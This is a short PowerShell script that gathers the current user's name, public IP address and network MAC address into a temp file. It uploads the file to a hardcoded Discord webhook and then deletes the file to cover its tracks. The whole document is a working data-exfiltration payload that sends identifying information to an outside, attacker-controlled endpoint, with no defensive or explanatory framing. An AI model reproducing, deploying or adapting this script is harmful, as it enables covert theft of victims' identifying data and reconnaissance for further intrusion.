# Define Discord webhook URL
$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"

try {
    # Create filename with UTC timestamp
    $FileName = "$env:temp\$env:USERNAME-Info-$(Get-Date -f yyyy-MM-dd_HH-mm).txt"

    # Get IP with error handling
    $ip = try { 
        (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -ErrorAction Stop).Content 
    } 
    catch { 
        "IP Unavailable" 
    }

    # Get first active MAC address
    $mac = (Get-NetAdapter -Physical | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress

    # Create system info file
    @"
    User: $env:USERNAME
    IP: $ip
    MAC: $mac
    "@ | Out-File $FileName -Force

    # Upload to Discord with error handling
    $result = curl.exe -F "file1=@$FileName" $hook 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "Upload failed: $result"
    }
}
catch {
    Write-Error "Error occurred: $_"
    # Optional: Send error notification to Discord
    $errorBody = @{ content = "Error: $_" } | ConvertTo-Json
    Invoke-RestMethod -Uri $hook -Method Post -Body $errorBody -ContentType "application/json"
}
finally {
    # Cleanup with verification
    if (Test-Path $FileName) {
        Remove-Item $FileName -Force -ErrorAction SilentlyContinue
    }
}
